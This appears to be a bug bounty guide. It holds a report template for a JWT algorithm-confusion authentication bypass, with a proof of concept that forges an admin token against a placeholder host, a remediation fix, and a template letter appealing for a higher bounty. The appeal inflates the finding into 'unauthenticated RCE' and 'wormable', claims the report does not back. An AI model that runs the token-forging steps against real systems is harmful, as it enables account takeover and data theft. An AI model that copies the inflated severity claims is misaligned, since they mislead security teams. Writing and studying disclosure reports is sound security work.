**Report Template for Maximum Impact**:

# [CRITICAL] Authentication Bypass via JWT Algorithm Confusion Leading to Full Administrative Access

## Summary
A critical vulnerability in the JWT implementation allows attackers to bypass authentication completely and gain administrative access to all user accounts and sensitive data.

## Vulnerability Details
- **Type**: Authentication Bypass (CWE-287)
- **Severity**: Critical (CVSS 9.8)
- **Affected Component**: `/api/auth/*` endpoints
- **Prerequisites**: None (unauthenticated attack)

## Technical Analysis
The application accepts JWT tokens signed with HS256 algorithm using the public RSA key as the secret. This allows an attacker to forge valid tokens with arbitrary claims.

### Root Cause
The JWT library fails to properly validate the algorithm specified in the token header against the expected algorithm, allowing algorithm confusion attacks.

## Proof of Concept

### Step 1: Obtain Public Key
```bash
curl https://target.com/.well-known/jwks.json | jq '.keys[0].x5c[0]' | base64 -d > public.pem
```

### Step 2: Create Malicious Token
```python
import jwt
import time

# Read public key
with open('public.pem', 'r') as f:
    public_key = f.read()

# Create admin token
payload = {
    "sub": "1",
    "role": "admin",
    "exp": int(time.time()) + 86400
}

# Sign with HS256 using public key as secret
token = jwt.encode(payload, public_key, algorithm='HS256')
print(f"Malicious token: {token}")
```

### Step 3: Access Admin Panel
```bash
curl -H "Authorization: Bearer [MALICIOUS_TOKEN]" https://target.com/api/admin/users
```

### Result
Successfully accessed admin panel and retrieved all user data including passwords hashes, PII, and payment information.

## Impact
- **Complete authentication bypass** for any user including administrators
- **Access to all user data** (10M+ records based on user ID sequences)
- **Ability to modify any data** including financial transactions
- **Full administrative control** over the application
- **Potential for complete business disruption**

## Reproduction Steps
1. Navigate to https://target.com
2. Intercept any request with Burp Suite
3. Add header: `Authorization: Bearer [MALICIOUS_TOKEN_HERE]`
4. Access any protected endpoint including `/api/admin/*`
5. Observe successful authentication bypass

## Evidence
[Screenshots showing admin access]
[Video demonstration: https://youtube.com/xyz]
[Sample of exposed data - redacted for privacy]

## Remediation
### Immediate Actions
1. **Disable JWT authentication** until fix is deployed
2. **Invalidate all existing sessions**
3. **Review logs** for exploitation attempts

### Permanent Fix
```python
# Enforce algorithm verification
def verify_token(token):
    try:
        # Explicitly specify allowed algorithms
        decoded = jwt.decode(
            token, 
            public_key, 
            algorithms=['RS256'],  # Only allow RS256
            options={"verify_signature": True}
        )
        return decoded
    except jwt.InvalidAlgorithmError:
        raise AuthenticationError("Invalid algorithm")
```

### Additional Recommendations
- Implement algorithm whitelisting in JWT library
- Add monitoring for algorithm confusion attempts
- Consider migrating to asymmetric-only authentication
- Implement additional authentication factors for admin access

**Bounty Negotiation Strategies**:

```markdown
## Bounty Appeal Template

Dear Security Team,

I respectfully request reconsideration of the bounty amount for report #12345 based on the following factors:

### Exceptional Impact
- This vulnerability affects **100% of users** (confirmed 2M+ accounts)
- Exploitation requires **no user interaction** and works on default configurations
- The attack is **wormable** and could spread automatically

### Discovery Complexity
- This required **40+ hours** of research and custom tool development
- The vulnerability was hidden behind 3 layers of encoding
- No automated scanner would have found this issue

### Comparison with Similar Reports
- Report #11111 (SQLi with limited impact): $5,000
- Report #22222 (XSS requiring user interaction): $3,000
- **This report** (Unauthenticated RCE): Currently $2,000

### Additional Value Provided
- Developed working patch (attached)
- Created detection rules for your SIEM
- Provided long-term security recommendations

Based on your bounty table and the critical nature of this finding, I believe a bounty of **$15,000** would be more appropriate.

I appreciate your consideration and remain available for any questions.

Best regards,
[Your Name]
```
